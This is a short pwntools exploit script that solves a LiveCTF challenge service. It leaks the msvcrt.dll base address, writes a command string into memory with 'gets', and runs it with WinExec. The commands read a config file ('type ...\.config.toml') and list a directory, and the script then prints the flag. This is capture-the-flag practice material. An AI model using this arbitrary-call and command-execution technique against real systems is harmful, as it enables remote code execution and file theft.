#!/usr/bin/env python3

from pwn import *

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

context.newline = '\r\n'
# context.log_level = 'debug'

p = remote(HOST, int(PORT))
# p = process("./challenge")
dllpath = "msvcrt.dll"

p.recvuntil("load?")
p.sendline(dllpath)
p.sendline("log")
p.sendline("1")

p.recvline()
p.recvline()
leak = p.recvline().split(b":")[1].strip()
msvcrt_base = int(b"0x" + leak, 16)
print(hex(msvcrt_base))

p.sendline(dllpath)
p.sendline("gets")
p.sendline(str(msvcrt_base + 0x98800))
p.sendline("cmd.exe /c type Z:\\home\\livectf\\.config.toml")

p.sendline("kernel32.dll")
p.sendline("WinExec")
p.sendline(str(msvcrt_base + 0x98800))

p.sendline(dllpath)
p.sendline("gets")
p.sendline(str(msvcrt_base + 0x98800))
p.sendline("cmd.exe /c dir")

p.sendline("kernel32.dll")
p.sendline("WinExec")
p.sendline(str(msvcrt_base + 0x98800))

flag = p.recvline_contains(b'LiveCTF{').decode().strip()
log.info('Flag: %s', flag)

p.interactive()